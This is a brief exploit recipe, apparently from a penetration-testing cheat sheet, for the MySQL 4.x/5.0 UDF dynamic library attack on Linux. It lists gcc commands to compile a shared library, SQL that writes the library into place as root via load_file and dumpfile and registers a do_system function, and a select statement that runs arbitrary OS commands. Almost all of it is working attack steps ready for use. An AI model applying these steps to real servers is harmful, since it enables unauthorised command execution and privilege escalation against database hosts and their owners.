# MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)

## Compile library

```bash
cd /tmp
gcc -g -c exploit.c -fPIC
gcc -g -shared -Wl,-soname,exploit.so -o exploit.so exploit.o -lc
```

## Exploit

Login:

```bash
mysql -u root
```

Load library:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/exploit.so'));
select * from foo into dumpfile '/tmp/exploit.so';
create function do_system returns integer soname 'exploit.so';
```

## Execute commands

```sql
select do_system('COMMAND');
```

## Source

- https://www.exploit-db.com/exploits/1518